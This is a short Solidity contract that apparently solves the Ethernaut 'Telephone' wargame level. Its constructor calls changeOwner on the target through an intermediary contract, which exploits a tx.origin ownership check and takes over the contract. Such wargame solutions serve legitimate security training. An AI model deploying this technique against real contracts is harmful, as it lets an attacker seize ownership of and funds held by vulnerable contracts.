// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TelephoneInterface{
    function changeOwner(address _owner) external;
}

contract AttackTelephone{
  TelephoneInterface telephone;

  constructor(address _TelephoneAddress,address _owner){
    telephone = TelephoneInterface(_TelephoneAddress);
    telephone.changeOwner(_owner);
  }
}